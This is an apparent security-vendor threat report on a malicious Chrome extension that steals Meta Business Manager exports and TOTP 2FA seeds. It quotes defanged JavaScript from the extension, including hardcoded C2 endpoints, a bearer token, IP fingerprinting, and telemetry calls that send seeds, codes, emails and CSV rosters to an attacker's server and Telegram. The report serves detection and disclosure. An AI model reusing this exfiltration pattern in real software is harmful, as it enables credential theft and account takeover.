---
title: "Malicious Chrome Extension Steals Meta Business Manager Exports and TOTP 2FA Seeds"
short_title: "Malicious Chrome Extension Steals Meta 2FA Seeds"
date: 2026-02-13 12:00:00 +0000
categories: [Malware, Browser Extensions]
tags: [Chrome, Meta, Facebook, Google, Infostealer, Threat Intelligence, Supply Chain Security, Credential Theft, T1195.002, T1176.001, T1204, T1059.007, T1005, T1119, T1590.005, T1589.002, T1591.002, T1556.006, T1071.001, T1567]
canonical_url: https://socket.dev/blog/malicious-chrome-extension-steals-meta-business-manager-exports-and-totp-2fa-seeds
source: Socket
image:
  path: https://cdn.sanity.io/images/cgdhsj6q/production/fbd6967f5da678c95170fdd4aea6664f72c6e892-1024x1024.png?w=1600&q=95&fit=max&auto=format
  alt: Malicious Chrome extension CL Suite artwork
description: "Chrome extension CL Suite by @CLMasters neutralizes 2FA for Facebook and Meta Business accounts while exfiltrating Business Manager contact and analytics data."
---

Socket's Threat Research Team identified a malicious Google Chrome extension [`CL Suite by @CLMasters`](https://socket.dev/chrome/package/jkphinfhmfkckkcnifhjiplhfoiefffl/overview/1.0.1) (extension ID `jkphinfhmfkckkcnifhjiplhfoiefffl`), that openly advertises itself as a way to scrape Meta Business Suite data and bypass verification friction and that also, behind the scenes, exfiltrates TOTP seeds, 2FA codes, Business Manager contact lists, and analytics data to infrastructure controlled by the threat actor.

Marketed in the Chrome Web Store as a way to "extract people data, analyze Business Managers, remove verification popups, and generate 2FA codes", the extension requests broad access to `meta.com` and `facebook.com` and claims in its privacy policy that 2FA secrets and Business Manager data remain local. In practice, the code transmits TOTP seeds and current one time security codes, Meta Business "People" CSV exports, and Business Manager analytics data to a backend at `getauth[.]pro`, with an option to forward the same payloads to a Telegram channel controlled by the threat actor.

By stealing TOTP seeds and codes for Facebook and Meta Business accounts, the extension effectively neutralizes 2FA protection and makes full account takeover trivial once a threat actor also has the corresponding password or recovery access from other sources such as infostealer logs or credential dumps. The exfiltrated Business Manager data includes names, emails, access levels, and associated ad accounts, giving the threat actor a detailed map of who controls which assets and enabling ad fraud, targeted compromise of additional employees, and long-term hijacking of business assets. The risk persists even after a victim uninstalls the extension, since the threat actor retains both the 2FA seeds and the exported business intelligence.

At the time of writing, the extension remains [live](https://chromewebstore.google.com/detail/cl-suite-by-clmasters/jkphinfhmfkckkcnifhjiplhfoiefffl) on the Chrome Web Store. We have notified Google and flagged this extension for removal.

![Socket AI Scanner's analysis of the malicious CL Suite by @CLMasters Chrome extension.](https://cdn.sanity.io/images/cgdhsj6q/production/7bc4f614fdee4c9cc3d78bbe9258451eab2521de-623x716.png?w=1600&q=95&fit=max&auto=format)
_Socket AI Scanner's analysis of the malicious [CL Suite by @CLMasters](https://socket.dev/chrome/package/jkphinfhmfkckkcnifhjiplhfoiefffl/overview/1.0.1) Chrome extension highlights that its background [script](https://socket.dev/chrome/package/jkphinfhmfkckkcnifhjiplhfoiefffl/files/1.0.1/js/background.js) collects Facebook account identifiers, 2FA seeds and codes, CSV exports, tab URL, public IP, and user agent, then exfiltrates this data with a hardcoded API key to getauth[.]pro telemetry and validation endpoints and forwards formatted dumps to a Telegram notification API, confirming deliberate credential and 2FA harvesting._

![Chrome Web Store listing for CL Suite by @CLMasters.](https://cdn.sanity.io/images/cgdhsj6q/production/f09092bd92606bb68f9f1a08ed72108ec76a5e39-1311x910.png?w=1600&q=95&fit=max&auto=format)
_Chrome Web Store listing for the `CL Suite by @CLMasters` extension openly advertises the ability to "extract people data, analyze Business Managers, remove verification popups, and generate 2FA codes" for Meta accounts, while the underlying code also harvests TOTP seeds, 2FA codes, and Business Manager contact and analytics data and exfiltrates it to threat actor-controlled infrastructure._

## From "Meta Business Suite Tools" to Silent Infostealer

Meta Business Suite and Facebook Business Manager are the administrative consoles organizations use to run their Facebook and Instagram presence at scale. From these panels, admins manage pages, ad accounts, pixels, catalogs, and user permissions for employees and agencies, and they can spend budget, change payment settings, add or remove staff, and control brand facing pages. In this context, any extension that sees those pages and their 2FA flows has direct exposure to high-value business data and authentication secrets.

![Official Meta landing page for its business tools ecosystem.](https://cdn.sanity.io/images/cgdhsj6q/production/375a0a2fc8ff33cc51c6efad82daa1ae5d6d0471-1974x1756.png?w=1600&q=95&fit=max&auto=format)
_Official Meta landing page for its business tools ecosystem, showing how Meta Business Suite, Business Manager, and Ads Manager provide a single admin surface for managing Facebook and Instagram pages, ads, and customer interactions, which highlights why any Chrome extension with access to these consoles, like `CL Suite by @CLMasters`, has direct reach into high-value business assets._

`CL Suite by @CLMasters` is published in the Chrome Web Store under the developer alias `CLMasters`, with the registration email `info@clmasters[.]pro`. The extension first appeared in the store on March 1, 2025 and was last updated on March 6, 2025. The listing shows a small user base of 28 users at the time of writing, but any victim who installs it while managing corporate assets risks losing control of those assets and exposing internal contact data.

The same developer hosts a privacy policy titled "Meta Business Suite Tools" that claims:

- 2FA secrets entered into the 2FA generator are stored locally in browser storage
- Meta Business Suite "People" data is processed locally and only saved when the user explicitly downloads it
- Any data sent to servers is anonymized usage data that does not contain personally identifiable information.

The code tells a different story. Across multiple modules, the extension packages sensitive data, including TOTP seeds, current one time codes, Facebook usernames and emails, and full CSV exports of Meta Business "People" and Business Manager analytics, and sends it to a telemetry API at `getauth[.]pro`. Many of these telemetry events are tagged with `sendTelegram: true`, which instructs the backend to forward the same payload to a Telegram channel controlled by the threat actor. In other words, the extension systematically performs the exact data collection and exfiltration that its own privacy policy says will not happen.

![Privacy policy page for Meta Business Suite Tools on clmasters[.]pro.](https://cdn.sanity.io/images/cgdhsj6q/production/f995312af4e572be733bd50f38ce35a32e02ed2c-2048x1540.png?w=1600&q=95&fit=max&auto=format)
_Privacy policy page for Meta Business Suite Tools on `clmasters[.]pro`, where the developer assures users that Meta Business Suite data and 2FA secrets are processed and stored locally in the browser, a claim that directly contradicts the extension's actual behavior of transmitting the same data to the threat actor-controlled `getauth[.]pro` backend._

## Key Malicious Flows

### 2FA Generator: Exfiltrating TOTP Secrets and Codes

For a browser-based 2FA helper like this extension, transmitting TOTP seeds or codes off device without explicit, informed consent is a serious security violation. `CL Suite` does exactly that. By stealing the seed and current codes for Facebook and Meta Business accounts, the extension effectively neutralizes 2FA and lets the threat actor generate valid codes indefinitely. On its own this does not steal the password, but once a password or recovery channel is compromised from other sources, account takeover becomes trivial and remains possible until 2FA is fully re-enrolled with a new secret.

### Exfiltration Pipeline to Threat Actor-Controlled C2 and Telegram

Below, the code snippets show the core logic with our inline comments and defanged C2 endpoints. The [background script](https://socket.dev/chrome/package/jkphinfhmfkckkcnifhjiplhfoiefffl/files/1.0.1/js/background.js) defines the C2 URLs and shared API key:

```javascript
const API_ENDPOINT             = 'https://getauth[.]pro/api/telemetry.php';
// Main telemetry / data exfiltration endpoint

const API_VALIDATION_ENDPOINT  = 'https://getauth[.]pro/api/validate.php';
// Endpoint the extension uses for "license" or feature validation

const TELEGRAM_NOTIFY_ENDPOINT = 'https://getauth[.]pro/api/telegram_notify.php';
// Backend relay that forwards selected payloads to Telegram

const API_KEY                  = 'w7ZxKp3F8RtJmN5qL2yAcD9v';
// Hardcoded bearer token shared by all installs
```

These constants are hardcoded. Every installation reports to the same backend and uses the same bearer token. The background script also [fingerprints](https://socket.dev/chrome/package/jkphinfhmfkckkcnifhjiplhfoiefffl/files/1.0.1/js/background.js#L24) the client's public IP:

```javascript
async function getClientIP() {
  try {
    const response = await fetch('https://api.ipify.org?format=json');
    const data     = await response.json();
    return data.ip;    // Public IP, used for victim fingerprinting
  } catch (error) {
    return 'Unknown';
  }
}
```

That IP becomes part of the telemetry payload and lets the threat actor correlate victims across sessions and environments.

### Client Side Telemetry Wrapper and C2 Flow

Most exfiltration flows go through a shared helper in [`js/common.js`](https://socket.dev/chrome/package/jkphinfhmfkckkcnifhjiplhfoiefffl/files/1.0.1/js/common.js#L9):

```javascript
// Generic helper to wrap and send telemetry
CLSuite.sendTelemetry = function (feature, data = {}, sendTelegram = false) {
  return new Promise((resolve) => {
    const os = CLSuite.getClientOS();     // Collect local OS fingerprint

    chrome.runtime.sendMessage({
      action:  "telemetry",
      feature: feature,                   // Tag event source (e.g. 2fa, people_extractor)
      data: {
        ...data,                          // Merge caller data
        os:         os,
        timestamp:  new Date().toISOString(),
        sendTelegram: sendTelegram        // Flag for Telegram forwarding
      }
    }, function (response) {
      resolve(response);                  // Return C2 response to caller
    });
  });
};
```

Key points:

- `feature` labels the source module, for example `'2fa'`, `'people_extractor'`, or `'bm_analytics'`
- `data` carries arbitrary payload fields; the helper automatically adds OS and a timestamp
- `sendTelegram` flags events that should also be forwarded to a Telegram channel.

The background script receives these messages, augments them with `getClientIP()`, then POSTs the result to `API_ENDPOINT` with an `Authorization: Bearer <API_KEY>` header. If `sendTelegram` is true, it also calls `TELEGRAM_NOTIFY_ENDPOINT`. Structurally, this is a classic telemetry pipeline, but the payloads contain highly sensitive data that users never consent to send.

Across the background script and feature modules, many network and parsing operations are wrapped in empty `try { } catch (e) { }` blocks that silently swallow errors. This pattern hides failures from the user, reduces visible noise if exfiltration breaks, and shows that the developer prioritizes keeping the extension quiet over clear error reporting or maintainable behavior.

Dynamic analysis tests confirm that `https://getauth[.]pro/api/telemetry.php` is live, returns structured JSON, and enforces the bearer token. The TLS certificate for `getauth[.]pro` is valid, issued by a trusted CA, and was renewed on January 26, 2026 with expiry in April 2026, which indicates active maintenance.

### Stealing 2FA Secrets and Codes

The malicious behavior appears when the extension sends the generated codes and associated account data off host. After computing the TOTP for the current Meta account, [`2fa-generator.js`](https://socket.dev/chrome/package/jkphinfhmfkckkcnifhjiplhfoiefffl/files/1.0.1/js/2fa-generator.js#L145) calls:

```javascript
// Send telemetry and request Telegram notification
CLSuite.sendTelemetry('2fa', {
  seed:           secret,            // TOTP secret (full 2FA seed)
  code:           code,              // Current 6-digit TOTP code
  facebook_user:  userInfo.username, // Facebook account identifier
  facebook_email: cleanEmail,        // Account email taken from UI
  sendTelegram:   true               // Also forward payload via Telegram
});
```

This payload contains:

- `seed`: the TOTP secret, which allows the threat actor to generate valid codes for that account
- `code`: the current six-digit TOTP value, confirming that the secret is valid
- `facebook_user` and `facebook_email`: identifiers tying the seed to a specific Meta business account.

TOTP is time-based, so generating a specific code for a specific moment requires both the secret and the timestamp. In practice, the threat actor has both: the extension sends the current code together with a timestamp in the telemetry wrapper, and the threat actor's server knows when it received the event. From that point on, the stolen seed lets the threat actor derive valid current and future codes for the account.

The privacy policy claims that 2FA secrets "are stored locally in your browser's storage and are not transmitted to our servers except as noted below" and describes the "noted below" transmission only as anonymized usage data for diagnostics, stating that this data "does not contain personally identifiable information" and that `getauth[.]pro` is used "for extension validation" only. In reality, every use of the built in 2FA generator sends the full TOTP seed, current code, Facebook username, and email address to `getauth[.]pro`, with an option to mirror the same payload to Telegram, and the extension never presents an in-product warning or consent dialog. This behavior goes well beyond anonymized diagnostics or validation and directly contradicts the policy's description of what leaves the browser.

## Exfiltrating Business Manager Contact Lists

The People Extractor module targets the Business Manager "People" view on `facebook.com` and `meta.com`. It walks the DOM, extracts table rows, and builds a CSV with:

- Names and email addresses of Business Manager users,
- Roles and permissions, and
- Status and access details (invited, active, access level).

The UI presents this as a convenience export. Under the hood, the same CSV is sent to the threat actor:

```javascript
// Send telemetry for exported Business Manager contacts
CLSuite.sendTelemetry('people_extractor', {
  peopleCount: peopleData.length,
  csvData:     csvContent,   // Full CSV: names, emails, roles, status, access details
  isDownload:  true          // Marks that user triggered a download
}, true);                    // Also request Telegram notification
```

And again when extraction finishes:

```javascript
if (peopleData.length > 0) {
  const csvContent = convertToCSV(peopleData);

  CLSuite.sendTelemetry('people_extractor', {
    peopleCount: peopleData.length,
    csvData:     csvContent   // Entire Business Manager user list sent to C2
  }, true);                   // Also request Telegram notification
}
```

As a result, each "download" action gives the threat actor a complete roster of Business Manager users and their effective access. This directly contradicts the privacy policy's promise that Meta Business Suite data is processed locally and that only anonymized usage data is transmitted.

### Business Manager Analytics and Payment Information

A separate "failsafe" analytics module ([`js/failsafe-bm-analytics.js`](https://socket.dev/chrome/package/jkphinfhmfkckkcnifhjiplhfoiefffl/files/1.0.1/js/failsafe-bm-analytics.js)) enumerates Business Manager-level entities and their linked assets. The resulting CSV includes:

- Business Manager IDs and names,
- Attached ad accounts,
- Connected pages and assets, and
- Billing and payment configuration details (which ad accounts use which funding sources).

Once built, the module exfiltrates the report. The policy mentions `getauth[.]pro` only for "extension validation" and does not disclose any export of Business Manager analytics or payment related information. In practice, the threat actor receives near real-time insight into which Business Managers exist, which ad accounts they control, and how those accounts are funded, which can be used for prioritizing ad-fraud or account-hijacking attempts.

In all of these flows, the heavy lifting (TOTP math, DOM scraping, CSV generation) happens locally, but the extension deliberately and unconditionally mirrors the sensitive results to a remote server and Telegram whenever the features are used.

## Outlook and Recommendations

`CL Suite by @CLMasters` shows how a narrow browser extension can repackage data scraping as a "tool" for Meta Business Suite and Facebook Business Manager. Its people extraction, Business Manager analytics, popup suppression, and in browser 2FA generation are not neutral productivity features, they are purpose-built scrapers for high-value Meta surfaces that collect contact lists, access metadata, and 2FA material straight from authenticated pages. Wiring each of these scraping flows into the same telemetry and Telegram pipeline makes the extension behave less like a helper and more like an infostealer focused on business intelligence and long-lived authentication material.

Even with a few dozen installs, an extension that weakens 2FA and clones Business Manager contact lists and analytics gives the threat actor enough context to identify high-value targets and come back later using credentials obtained elsewhere. As platforms tighten API access and harden against automated scraping, especially in the wake of LLM training and data-licensing disputes, we should expect more browser-based tools that openly offer scraping and "friction reduction" for specific platforms while quietly sending a copy of everything to the operator. Similar designs are likely to appear against ad platforms, CRM backends, and cloud admin consoles: a browser extension that promises exports or 2FA help, requests broad host access, then streams seeds, codes, and structured business data to a backend and real-time channels.

Organizations should tighten control over extensions on systems that access Meta Business Suite, Facebook Business Manager, and comparable consoles by enforcing allow lists, reviewing high-privilege extensions, and monitoring for unusual network traffic and domains. Detection teams can turn this case into concrete rules by looking for extensions with very broad host permissions, shared bearer tokens, hidden telemetry wrappers, and unexpected flows of TOTP seeds or business contacts. To bring supply chain security into the browser itself, use [**Socket's Chrome extension protection**](https://chromewebstore.google.com/detail/socket-security/jbcobpbfgkhmjfpjjepkcocalmpkiaop?pli=1) to inventory extensions in use, surface requested permissions and host access, and block risky updates before they land on endpoints, leveraging the same analysis engine Socket applies to other open source ecosystems.

## Indicators of Compromise (IOCs)

### Malicious Chrome Extension

- Name: [`CL Suite by @CLMasters`](https://socket.dev/chrome/package/jkphinfhmfkckkcnifhjiplhfoiefffl/overview/1.0.1)
- Extension ID: `jkphinfhmfkckkcnifhjiplhfoiefffl`

### Threat Actor Identifiers

- Website: `clmasters[.]pro`
- Email (Chrome Web Store): `info@clmasters[.]pro`
- Privacy policy contact: `privacy@clmasters[.]pro`

### C2 Infrastructure and API Key

- Domain: `getauth[.]pro`
- Telemetry endpoint: `https://getauth[.]pro/api/telemetry.php`
- Validation endpoint: `https://getauth[.]pro/api/validate.php`
- Telegram notification endpoint: `https://getauth[.]pro/api/telegram_notify.php`
- API key: `w7ZxKp3F8RtJmN5qL2yAcD9v`

## MITRE ATT&CK

- T1195.002 — Supply Chain Compromise: Compromise Software Supply Chain
- T1176.001 — Software Extensions: Browser Extensions
- T1204 — User Execution
- T1059.007 — Command and Scripting Interpreter: JavaScript
- T1005 — Data from Local System
- T1119 — Automated Collection
- T1590.005 — Gather Victim Network Information: IP Addresses
- T1589.002 — Gather Victim Identity Information: Email Addresses
- T1591.002 — Gather Victim Org Information: Business Relationships
- T1556.006 — Modify Authentication Process: Multi-Factor Authentication
- T1071.001 — Application Layer Protocol: Web Protocols
- T1567 — Exfiltration Over Web Service
